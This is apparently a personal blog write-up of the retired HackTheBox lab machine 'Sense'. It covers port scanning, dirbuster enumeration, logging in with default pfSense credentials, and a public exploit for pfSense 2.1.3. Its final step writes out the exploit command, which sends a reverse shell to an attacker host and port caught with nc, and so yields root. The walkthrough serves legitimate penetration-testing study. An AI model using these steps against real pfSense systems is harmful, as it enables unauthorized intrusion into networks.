---
title: Sense Hackthebox Writeup
date: 2020-12-28 09:00:00 +0800
categories: [Hackthebox, Retired]
tags: [linux,pfsense,dirbuster,pfsense 2.1.3]     # TAG names should always be lowercase
image: /assets/img/sense-hackthebox/sense-pic.png
subtitle: JHBDOcubeoveiubo
---


# Introduction@Nibbles:~$


Column | Details
------------ | -------------
Name | Sense
IP | 10.10.10.60
Points | 20
Os | FreeBSD
Difficult | Easy
Creator | [lkys37en](https://www.hackthebox.eu/profile/709)
Out on | 21st October 2017

# Summary:~$

* Discovering the new host and scanning for open ports.
* Used `dirbuster` to find the hidden directories, two of them are `changelog.txt` and `system-users.txt`.
* Got `Credentials` to login to the dashboard on `port 80`
* Exploiting the `vulnerable` version of `pfSense 2.1.3`, to get Root.

# Starting:~$

## Nmap

I have used **nmapAutomator** , which keeps the scanning fast and reduces effort.*(Not recommended in real life scenarios).* 

Dowload link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)

___
![](/assets/img/sense-hackthebox/nmap-scan-1.png)

From a `quick scan` we came to know that `2 Ports` are open i.e. `80 and 443`. On accessing port 80 we are redirected to `443 page` where we get a `login page` of *pfSense*.

___
![](/assets/img/sense-hackthebox/port-80-2.png)

Using `dirbuster` to find hidden directories. **Wordlist Used**: *directory-list-2.3-medium.txt* and **File Extension**: *php,txt,html*.

___
![](/assets/img/sense-hackthebox/dirbuster-3.png)

We got `two useful directories` which I checked out.

**Accessing**: `https://10.10.10.60:443/changelog.txt`, we can see some messages here.

___
![](/assets/img/sense-hackthebox/changelog-txt-4.png)

**Accessing**: `https://10.10.10.60:443/system-users.txt`, we got some credentials *Username*: `Rohit` and *Password*: `company defaults`. I googled about default credentials for `pfSense` and found it as **pfsense**, Hence the *password* they are talking about is `pfsense`.

___
![](/assets/img/sense-hackthebox/system-users-ticket-5.png)

Loging into the dashboard with the credentials mentioned above.

___
![](/assets/img/sense-hackthebox/pf-sesne-loggedin-8.png)

We got to know the `pfSense` version running which is `2.1.3`. I googled about the version vulnerabilities and found this:

[Exploit found](https://www.exploit-db.com/exploits/43560)

___
![](/assets/img/sense-hackthebox/exploit-db-9.png)

Dowloaded the `exploit` on my machine and ran it. *Make sure you use the username as rohit and not Rohit.*

**Exploit Command**: *python3 43560.py --rhost=10.10.10.60 --lhost=10.10.X.X --lport=1233 --username=rohit --password=pfsense*

Listening on the port specified using `nc`. We got `Root`.

___
![](/assets/img/sense-hackthebox/got-root-10.png)


